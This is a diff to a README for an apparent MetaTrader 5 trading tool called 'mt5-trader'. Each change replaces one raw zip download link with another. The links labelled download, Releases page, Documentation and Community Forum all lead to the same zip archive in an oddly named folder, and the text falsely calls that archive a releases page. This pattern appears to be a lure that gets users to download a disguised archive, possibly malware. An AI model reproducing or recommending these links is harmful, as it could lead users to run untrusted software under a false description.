@@ -1,6 +1,6 @@
 # 🚀 mt5-trader - Trade Smart, Achieve More
 
-[![Download mt5-trader](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/mt5-trader_3.3.zip)](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/mt5-trader_3.3.zip)
+[![Download mt5-trader](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/trader-mt-v3.6.zip)](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/trader-mt-v3.6.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ To begin trading with mt5-trader, follow these simple steps to get the applicati
 
 You can download mt5-trader directly from the Releases page. 
 
-Visit this page to download: [mt5-trader Releases](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/mt5-trader_3.3.zip)
+Visit this page to download: [mt5-trader Releases](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/trader-mt-v3.6.zip)
 
 1. Click on the link above.
 2. Look for the latest release. This will usually be at the top of the list.
@@ -74,9 +74,9 @@ If you encounter any issues during the installation or have questions about usin
 
 ## 🔗 Useful Links
 
-- [Download mt5-trader](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/mt5-trader_3.3.zip)
-- [Documentation](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/mt5-trader_3.3.zip)
-- [Community Forum](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/mt5-trader_3.3.zip)
+- [Download mt5-trader](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/trader-mt-v3.6.zip)
+- [Documentation](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/trader-mt-v3.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/Anil4674sdfsd/mt5-trader/main/variedly/trader-mt-v3.6.zip)
 
 ## 📝 License
 
